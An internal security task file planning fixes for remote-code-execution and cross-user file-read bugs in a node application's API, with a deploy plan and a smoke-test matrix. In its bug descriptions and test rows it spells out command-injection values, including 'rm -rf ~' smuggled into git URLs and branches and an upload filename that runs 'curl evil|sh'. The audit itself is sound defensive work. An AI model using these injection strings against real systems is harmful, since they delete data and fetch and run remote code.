# Wave 5 — Pre-Release Lockdown (RCE & Cross-User Isolation)

**Task ID**: `SEC-2026-04-22-WAVE5-PRE-RELEASE`
**Created**: 2026-04-22
**Status**: 🔴 **Proposed — awaiting Sash approval. RELEASE-BLOCKING for v1.2.**
**Priority**: P0 — must close before tagging `v1.2.0`
**Findings closed**: A1 (RCE — terminal), A2 (RCE — git), A3 (Critical — backup chain), A4 (High — cross-user file read), A5 (High — voice install)
**Source**: Internal audit performed 2026-04-22 after the seven jhond0e items closed. See [`SEC_2026_04_21_AUDIT_DISPOSITION.md`](../../../docs/handover/SEC_2026_04_21_AUDIT_DISPOSITION.md) §"Internal Audit Findings (2026-04-22)".

---

## TL;DR for a 9th grader

After we fixed everything jhond0e (the security researcher) found, I went back and read all our other API endpoints — the ones he didn't have time to look at. I found five more bugs of the same family:

1. **Terminal endpoint** — anyone with a session can ask the node to run any shell command. Was meant for the owner only; the "owner only" check was missing.
2. **Git endpoint** — same shape. Asking the node to clone a repo with a malicious URL like `https://x"; rm -rf ~; "y` runs `rm -rf ~` on the owner's machine.
3. **Backup endpoints** — anyone with a session (including a wallet the owner gave guest access to) can download the owner's backup file, which contains the node's identity key. They can also upload their own backup that overwrites everything when restored, taking over the node.
4. **File read** — if Bob has guest access to Alice's node, he can ask `GET /read?path=/0xAlice/Documents/secret.txt` and the server returns Alice's file. The "owner check" silently fell back to whatever wallet was in the path.
5. **Voice install** — guest wallets can trigger `sudo apt-get install …` and write systemd unit files into `/etc/`.

All five are the same fix: add `requireOwner` to the route, and replace the shell-string command with the argv form (the same SEC-2 pattern Wave 3 used for vless). One of them (#4) needs the cross-wallet fallback removed entirely.

These are all hard-fixes — no kill-switch. They cannot be turned off and they apply on day one of v1.2. We are not shipping v1.2.0 until this wave is merged and verified.

---

## Why this wave exists

The jhond0e report covered three handlers in detail (`/api/setup/mnemonic`, `/api/vless/register`, `/auth/particle`). After we closed those, I audited the remaining ~46 API files in `pc2-node/src/api/` plus the gateway for the same primitives:

- `execSync`/`exec`/`spawn` with shell:true called with any user-controlled string
- Routes mounted with `authenticate` only (missing `requireOwner`) that perform privileged actions
- Cross-wallet data leaks in fallback code paths

I found five issues bad enough to block the release. Wave 6 (post-cutover) handles seven more medium-severity issues, and Wave 7 covers three lower-severity polish items.

---

## What this wave does

Five surgical fixes, each in a single file. Total estimated diff ≈ 200 LOC. No new abstractions, no schema changes, no kill-switches.

### Fix A1 — `/api/terminal/exec` and `/api/terminal/script`

**Files**: `pc2-node/src/api/terminal.ts`, `pc2-node/src/api/index.ts`

**Bug**: The exec handler at `terminal.ts:268-384` runs any string the caller sends through `/bin/bash`. The "escape" at line 332 only escapes double quotes; `;`, `&&`, `$()`, and backticks all pass through. The script endpoint at `:399-497` is even more direct — it accepts a script body plus an interpreter name from a list including `python3`, `node`, `perl`, `ruby`, all of which can spawn processes by themselves. Both endpoints were registered in `index.ts:1306-1308` with **`authenticate` only**, no `requireOwner`. Any tethered wallet can RCE the node.

**Fix**:
1. In `index.ts:1306-1308`, add `requireOwner` to all three terminal POST routes:
   ```ts
   app.post('/api/terminal/exec',   authenticate, requireOwner, handleExecCommand);
   app.post('/api/terminal/script', authenticate, requireOwner, handleExecScript);
   app.get ('/api/terminal/tools',  authenticate, requireOwner, handleListTools);
   ```
2. In `terminal.ts:336-368`, drop the `shell: '/bin/bash'` branch entirely. Replace with `execFile(body.command, body.args ?? [], opts)`. If the request body has `shell: true`, return `400 Bad Request` ("shell mode disabled — pass argv via the args field").
3. In `terminal.ts:474-485` (script endpoint), keep writing the script to a temp file but spawn the interpreter as `execFile(interpreter, [scriptPath], opts)` — never compose a shell string.
4. Tighten the interpreter allowlist to only `/bin/bash`, `/bin/sh`, `python3`, `node` (drop `python`, `ruby`, `perl` — none of these are required by any current consumer).

**UX impact**: Zero for the owner. Tethered wallets now get a clear `403 Forbidden — owner access required` instead of running commands. AI agents (which the script endpoint was designed for) continue to work — the AI runs as the owner.

### Fix A2 — All `/api/git/*` endpoints

**File**: `pc2-node/src/api/git.ts`

**Bug**: Every handler builds a shell command by string concatenation, then runs it via `promisify(exec)` — a shell. Three injection points in `handleGitClone` alone (`git.ts:122-129`):

- `body.branch` is unquoted — `branch: ';rm -rf ~;'` runs `rm -rf ~`.
- `body.url` is double-quoted but bash still expands `$(…)` inside `"…"`.
- `body.url` can also escape the quote: `https://x"; rm -rf ~; "y`.

`handleGitCommit:265-273` has the same shape: `escapedMessage` only escapes `"`, but `$(…)` survives.

**Fix**: Convert every `execGit(commandString, cwd)` call to argv form. Refactor `execGit` to take `(args: string[], cwd, timeout)` and call `execFile('git', args, opts)`. Per-handler conversions:

| Handler | Old shell string | New argv |
|---|---|---|
| `handleGitClone` | `` `git clone --branch ${body.branch} --depth ${body.depth} "${body.url}" "${fullPath}"` `` | `['clone', ...(body.branch ? ['--branch', body.branch] : []), ...(body.depth ? ['--depth', String(body.depth)] : []), body.url, fullPath]` |
| `handleGitStatus` | `git status --porcelain` etc. | `['status', '--porcelain']` etc. |
| `handleGitCommit` | `` `git commit -m "${escapedMessage}"` `` | `['commit', '-m', body.message]` |
| `handleGitPush` | string with remote/branch | `['push', remote, branch]` |
| `handleGitPull` | string with remote/branch | `['pull', remote, branch]` |
| `handleGitLog` | `` `git log -${count} --format=…` `` | `['log', `-${count}`, '--format=…']` (count clamped to int 1-1000 first) |

**Bonus hardening**: Validate `body.url` against `/^(https:\/\/|git@)[A-Za-z0-9._\-:/@]+$/` before passing to git. Reject `body.branch` that doesn't match `/^[A-Za-z0-9._\-/]+$/` (git ref grammar).

**UX impact**: None. `execFile` accepts the same inputs git itself accepts. The bonus regex rejects `git@host:user/repo with spaces.git`-style names which were never valid git URLs anyway.

### Fix A3 — Backup endpoints (download / restore / create / delete)

**Files**: `pc2-node/src/api/index.ts`, `pc2-node/src/api/backup.ts`

**Bug**: Two unrelated issues, both in the backup chain:

1. All five backup routes are mounted in `index.ts:1293-1297` with **`authenticate` only**. A tethered wallet can:
   - `GET /api/backups` — list all backups
   - `GET /api/backups/download/<filename>` — download the owner's `data/identity.json` and other secrets
   - `DELETE /api/backups/<filename>` — wipe the owner's backups
   - `POST /api/backups/restore` — upload an attacker-crafted tarball that includes their own `config.json` ⇒ on next restart, **the node belongs to the attacker**
2. `backup.ts:283` shells out: `execAsync(\`node "${restoreScriptPath}" "${savedFilename}"\`)`. `savedFilename` is derived from `req.file.originalname` (the upload's filename), which the attacker fully controls. A filename like `x.tar.gz" ; bash -c "curl evil|sh" ; "y.tar.gz` shell-injects.

**Fix**:
1. Add `requireOwner` to every backup route in `index.ts:1293-1297`:
   ```ts
   app.post  ('/api/backups/create',                authenticate, requireOwner, createBackup);
   app.get   ('/api/backups',                       authenticate, requireOwner, listBackups);
   app.get   ('/api/backups/download/:filename',    authenticate, requireOwner, downloadBackup);
   app.delete('/api/backups/:filename',             authenticate, requireOwner, deleteBackup);
   app.post  ('/api/backups/restore',               authenticate, requireOwner, restoreUpload.single('file'), restoreBackup);
   ```
2. In `backup.ts:54` (`createBackup`), convert `execAsync(\`node "${backupScriptPath}"\`)` to `execFile('node', [backupScriptPath], opts)`.
3. In `backup.ts:283` (`restoreBackup`), convert to `execFile('node', [restoreScriptPath, savedFilename], opts)`.
4. In `backup.ts:212-260` (the upload handler), validate `req.file.originalname` against `/^[A-Za-z0-9._-]+\.tar\.gz$/` before any use. Reject with `400` if it fails. Even with argv form this is belt-and-braces — restore.js itself reads the file by name and we don't want surprises like `..` or null bytes downstream.
5. In `backup.ts:212-260`, validate the uploaded backup's contents before calling restore: refuse to restore a tarball whose `config.json` declares a `wallet_address` different from the current owner. (Defence in depth — `requireOwner` on the route means only the owner can call this anyway, but it stops an attacker who somehow got the owner's session from swapping the owner during a single request.)

**UX impact**:
- The backup UI in the desktop app must already check ownership before showing the panel (it's labelled "Owner only"); adding `requireOwner` server-side just enforces what the UI already implies.
- Tethered wallets that try to access the backup panel get a clear `403 Forbidden — owner access required` toast.
- Filename validation rejects creative names; the restore script already required `.tar.gz` so this is a strict subset of what worked before.

### Fix A4 — `/read` cross-user fallback

**File**: `pc2-node/src/api/filesystem.ts`

**Bug**: Lines 577-586 contain a "fallback" that retries file lookup using a wallet address parsed from the file path itself, not the requester's wallet. Comment claims it handles "EOA vs smart wallet" but the implementation does **not** verify that the path-derived wallet is actually an alias of the requester. As written, Bob (tethered) can call `GET /read?path=/0xAlice/Documents/secret.txt` and the fallback returns Alice's file.

**Fix**:
1. Remove the fallback entirely. The "EOA vs smart wallet" case it was meant to address is handled correctly by `compareAddresses` + `tethered_wallets` in `verifyOwner`. We need that property to hold at the storage layer too — but the right place to express it is in `tethered_wallets`, not in an unconditional path-derived retry.
2. Replace with an explicit alias check: only retry if `pathWallet` is in `req.user.tethered_wallets` AND `pathWallet === req.user.smart_account_address` (the documented EOA↔smart-account pairing).

**Concretely**: change `filesystem.ts:577-586` to:

```ts
if (!fileMetadata) {
  const pathParts = resolvedPath.split('/').filter(Boolean);
  const pathWallet = pathParts[0];
  const isEvmAddr = pathWallet && /^0x[0-9a-fA-F]{40}$/.test(pathWallet);
  // Permit ONLY the documented EOA↔smart-account pairing for the
  // currently authenticated user. Cross-user reads are denied.
  const isOwnAlias = isEvmAddr && req.user && (
    pathWallet.toLowerCase() === req.user.smart_account_address?.toLowerCase()
  );
  if (isOwnAlias) {
    fileMetadata = filesystem.getFileMetadata(resolvedPath, pathWallet!);
    if (fileMetadata) {
      walletAddress = pathWallet!;
    }
  }
}
```

**Search for the same pattern elsewhere**: I'll grep `pathWallet` / "fallback" comments in `filesystem.ts`, `file.ts`, `media.ts`, `storage.ts`, `public.ts`, `info.ts` and apply the same fix anywhere else this anti-pattern lives.

**UX impact**:
- Single-user nodes (where Alice owns one EOA + one smart account): zero behaviour change. Reads via either wallet still resolve.
- Multi-user nodes (owner has tethered other people via `/api/access/add`): tethered wallets now see only their own files. They get a clean `404 File not found` instead of a leaked file. **This is the correct behaviour** — tethered access was never documented as "you can read my files".
- Files saved under a wallet not yet known to the session (smart account swap mid-session) require a reauth, same as today.

### Fix A5 — Voice install/enable/disable owner check

**File**: `pc2-node/src/api/voice.ts`

**Bug**: `/voice/install`, `/voice/enable`, `/voice/disable` are mounted at lines 386-418 with `authenticate` only. They run `sudo systemctl …`, `sudo apt-get install …`, write systemd unit files into `/etc/systemd/system/`. None of these should be reachable by a tethered wallet.

**Fix**:
1. Import `requireOwner` from `./middleware.js`.
2. Add `requireOwner` to `/voice/install`, `/voice/enable`, `/voice/disable`. Keep `/voice` (the actual STT→LLM→TTS pipeline) and `/voice/status` on `authenticate` only — those serve UX features tethered wallets reasonably need.

**UX impact**: Tethered wallets can still talk to the node via voice (they get the same AI experience). They just can't trigger a system-wide install/uninstall of whisper/piper.

---

## Telemetry log format

Every fix in this wave is a **deny** primitive — there's no kill-switch and no log-only mode (those are for compatibility-sensitive Wave 2/3 behaviours). The new log lines we'll see post-merge:

```
[auth] denied=requireOwner route=/api/terminal/exec wallet=0x… owner=0x…
[auth] denied=requireOwner route=/api/git/clone wallet=0x… owner=0x…
[auth] denied=requireOwner route=/api/backups/download wallet=0x… owner=0x…
[fs]   denied=cross-user-read req-wallet=0x… path=/0xVictim/… reason=not-an-alias
[auth] denied=requireOwner route=/api/voice/install wallet=0x… owner=0x…
```

The first day post-deploy we should grep for these — any non-zero count tells us either (a) a tethered wallet is misbehaving, or (b) an iframe app sent the owner's session to a route it shouldn't (in which case we'd want to know).

---

## Smoke matrix to execute at CP-5

Local node booted on `127.0.0.1:3001`. Two sessions:
- `OWNER_TOK` — primary wallet's session.
- `TETH_TOK` — a tethered allowed wallet's session (created via `/api/access/add` then `/auth/particle` with that wallet).

| # | Test | Expected | Got |
|---|------|----------|-----|
| 1 | Owner: `POST /api/terminal/exec  {command:'whoami'}` | 200, stdout=current user | ⏳ |
| 2 | Owner: `POST /api/terminal/exec  {command:'echo $(date)'}` | 200, stdout literal `$(date)` (no shell) | ⏳ |
| 3 | Owner: `POST /api/terminal/exec  {command:'rm', args:['-f','/tmp/ws5-test']}` | 200, file removed | ⏳ |
| 4 | Owner: `POST /api/terminal/exec  {shell:true, command:'echo x'}` | 400 — shell mode disabled | ⏳ |
| 5 | Tethered: `POST /api/terminal/exec  {command:'whoami'}` | 403 owner access required | ⏳ |
| 6 | Owner: `POST /api/git/clone  {url:'https://example.com/x"; touch /tmp/pwn; "y'}` | 400 invalid url OR clone fails cleanly; no `/tmp/pwn` created | ⏳ |
| 7 | Owner: `POST /api/git/clone  {url:'https://github.com/git/git', branch:'master;touch /tmp/pwn'}` | 400 invalid branch OR clone fails; no `/tmp/pwn` created | ⏳ |
| 8 | Owner: `POST /api/git/commit  {message:'$(touch /tmp/pwn)'}` | 200, commit message literal; no `/tmp/pwn` | ⏳ |
| 9 | Tethered: `POST /api/git/clone  {url:'https://github.com/git/git'}` | 403 | ⏳ |
| 10 | Tethered: `GET /api/backups` | 403 | ⏳ |
| 11 | Tethered: `GET /api/backups/download/<owner-backup>` | 403 | ⏳ |
| 12 | Tethered: `POST /api/backups/restore` (upload tarball) | 403 | ⏳ |
| 13 | Owner: upload backup with originalname `evil"; touch /tmp/pwn; ".tar.gz` | 400 invalid filename | ⏳ |
| 14 | Owner: upload backup with valid `mybackup-2026-04-22.tar.gz` | 200 + restore starts | ⏳ |
| 15 | Tethered: `GET /read?path=/0xOwner/Documents/secret.txt` | 404 (not 200 with content) | ⏳ |
| 16 | Owner with smart-account session: `GET /read?path=/0xOwnerEOA/file.txt` | 200, returns content | ⏳ |
| 17 | Owner with EOA session: `GET /read?path=/0xOwnerSmartAcct/file.txt` | 200, returns content | ⏳ |
| 18 | Tethered: `POST /api/voice/install` | 403 | ⏳ |
| 19 | Owner: `POST /api/voice/install` | 200 + background install starts | ⏳ |

Each row gets a curl one-liner in the test harness (`pc2-node/tests/security/wave5-smoke.sh`) so this can be re-run on every release.

---

## Files

### Modified

- `pc2-node/src/api/index.ts` — add `requireOwner` to terminal × 3, backup × 5, no other route changes
- `pc2-node/src/api/terminal.ts` — drop `shell: '/bin/bash'`, switch to `execFile`, refuse `body.shell === true`, tighten interpreter allowlist
- `pc2-node/src/api/git.ts` — refactor `execGit` to argv form, convert all six handlers, add input regex validation
- `pc2-node/src/api/backup.ts` — switch `execAsync` to `execFile`, validate `originalname`, owner-binding check on uploaded `config.json`
- `pc2-node/src/api/filesystem.ts` — replace cross-wallet fallback with smart-account alias check; sweep for the same anti-pattern in `file.ts`, `media.ts`, `storage.ts`, `public.ts`, `info.ts`
- `pc2-node/src/api/voice.ts` — add `requireOwner` to install/enable/disable

### Created

- `.cursor/tasks/SEC-2026-04-22-WAVE5-PRE-RELEASE/SEC-2026-04-22-WAVE5-PRE-RELEASE.md` (this file)
- `pc2-node/tests/security/wave5-smoke.sh` — 19-case smoke matrix
- `pc2-node/tests/security/wave5-args-vs-shell.test.js` — unit tests proving:
  - `terminal.handleExecCommand` does not interpret `$(…)` or `;`
  - `git.execGit('clone', [maliciousArg])` does not interpret shell metacharacters
  - `backup.restoreBackup` rejects originalnames with shell metacharacters
  - `filesystem.handleRead` returns 404 for cross-wallet paths

---

## Deploy plan

This wave is pure code; no schema migration, no kill-switch, no service restart on the gateway side. Standard PC2-node release flow:

1. **Merge to `feature/lit-chipotle-migration`** (or whichever branch v1.2 ships from). Each fix in its own commit so revert is granular if needed:
   - `security(pc2-node): SEC-2026-04 Wave 5a — terminal endpoint owner lockdown + argv-only exec`
   - `security(pc2-node): SEC-2026-04 Wave 5b — git endpoints argv-only + input validation`
   - `security(pc2-node): SEC-2026-04 Wave 5c — backup endpoints owner lockdown + safe restore`
   - `security(pc2-node): SEC-2026-04 Wave 5d — /read cross-wallet fallback removal`
   - `security(pc2-node): SEC-2026-04 Wave 5e — voice install/enable/disable owner lockdown`

2. **Run quality gates**:
   - `npm run test:security` — must pass (existing 79 + new 12 cases)
   - `bash pc2-node/tests/security/wave5-smoke.sh` against a fresh local node
   - `npx tsc -p pc2-node --noEmit` — 0 errors
   - ESLint clean on touched files

3. **Tag** `v1.2.0` once all green. Wave 5 fixes are part of the v1.2 binary; nothing to flip on release day.

4. **Watch** the `[auth] denied=requireOwner` and `[fs] denied=cross-user-read` log lines for 48 h post-release. Any unexpected hit → Slack alert + investigate.

---

## Rollback

Each commit is independently revertable:

| Fix | If reverted |
|---|---|
| Wave 5a (terminal) | Tethered wallets regain RCE; immediate re-deploy required if revert is for any reason other than "unrelated CI fix" |
| Wave 5b (git) | Tethered wallets regain RCE via shell-injection in git URL/branch/message |
| Wave 5c (backup) | Tethered wallets regain owner-mnemonic exfil + node takeover |
| Wave 5d (filesystem) | Tethered wallets regain cross-user file read |
| Wave 5e (voice) | Tethered wallets regain ability to trigger sudo apt and write systemd units |

In other words: **none of these should ever be reverted on a v1.2.x line**. If a regression is discovered, fix forward.

---

## Acceptance criteria

- [ ] `rg 'authenticate, handleExecCommand' pc2-node/src/api/index.ts` returns 0 (only `authenticate, requireOwner, handleExecCommand` survives)
- [ ] `rg 'shell:.*bash' pc2-node/src/api/terminal.ts` returns 0
- [ ] `rg 'execAsync\(`' pc2-node/src/api` returns 0 in `git.ts`, `backup.ts`
- [ ] All 19 smoke-matrix cases pass
- [ ] All `wave5-args-vs-shell.test.js` cases pass
- [ ] No regression in `npm run test:security`
- [ ] Manual: as a tethered wallet, attempting any owner-only endpoint returns `403 owner access required` with no side effect on the node
- [ ] Manual: as the owner with a smart-account session, reading a file saved under the EOA still works
- [ ] Manual: the desktop UI's terminal app still works for the owner
- [ ] Manual: the desktop UI's backup panel still works for the owner

---

## UX notes — what users see

| User type | Before Wave 5 | After Wave 5 |
|---|---|---|
| **Owner — single wallet** | Everything works | Everything works (no behaviour change) |
| **Owner — EOA + smart account** | Both wallets read same files | Both wallets read same files (alias check preserves this) |
| **Tethered wallet** (granted via `/api/access/add`) | Could RCE, exfil backups, read other users' files | Sees their own files only; gets `403 owner access required` toast on owner-only actions |
| **Iframe app with scoped session** (file viewer) | Already blocked by Wave 1 scope check | Unchanged — still blocked |
| **External attacker, no session** | Blocked at `authenticate` | Blocked at `authenticate` (no change) |

The desktop UI should already gate the Settings → Backup, Settings → Voice AI, and Terminal app behind an "owner only" badge. If it doesn't, that's a UI change for the same release: hide the menu items entirely for non-owner sessions so a tethered wallet doesn't see options that 403. (Filed as a follow-up sub-task; not a blocker for this wave's server-side fix.)

---

## Known follow-ups (not blocking — Wave 6/7)

- **Wave 6 — A6**: `system.ts` restart commands still use `shell:'/bin/bash'`. Defense-in-depth polish, not exploitable today.
- **Wave 6 — A7**: `/api/ai/install-ollama` is `curl|sh`. Pin SHA-256.
- **Wave 6 — A8**: `/api/esc-rpc` uses `rejectUnauthorized: false`. Pin Contabo cert.
- **Wave 6 — A9**: `/api/esc-nft/:path(*)` open-proxy needs allowlist.
- **Wave 6 — A10**: `/api/catalog/reindex` and the GraphQL proxies are unauth — add auth + IP rate limit.
- **Wave 6 — A11**: `/api/http` SSRF list is DNS-rebind bypassable — pin resolved IP.
- **Wave 6 — A12**: Wallet proposal approve/reject/execute don't bind to `req.user.wallet_address`.
- **Wave 7 — A13**: CORS allowlist includes `.ela.local` and uses `.includes()`.
- **Wave 7 — A14**: Auth middleware logs full session token at INFO.
- **Wave 7 — A15**: Capsule-unsigned app installs warn-only (already on v2 roadmap).

---

## Communications

When this lands and v1.2 ships, the public note in CHANGELOG should add:

> **🔒 Security (P0) — Internal audit follow-up to jhond0e triage:**
> Wave 5 closes five additional findings (A1-A5) discovered during a post-triage internal sweep of the remaining ~46 API endpoints not covered by the original report. All five were the same family of bugs (missing `requireOwner` + shell-string command construction + cross-user fallback) and have been fixed using the same hard-fix pattern as SEC-2/SEC-7/SEC-10. No kill-switches; enforcement is on day one. See `docs/handover/SEC_2026_04_21_AUDIT_DISPOSITION.md` §"Internal Audit Findings (2026-04-22)".

The bug-bounty response to jhond0e should mention that we self-discovered five additional issues of the same family and closed them in the same release.
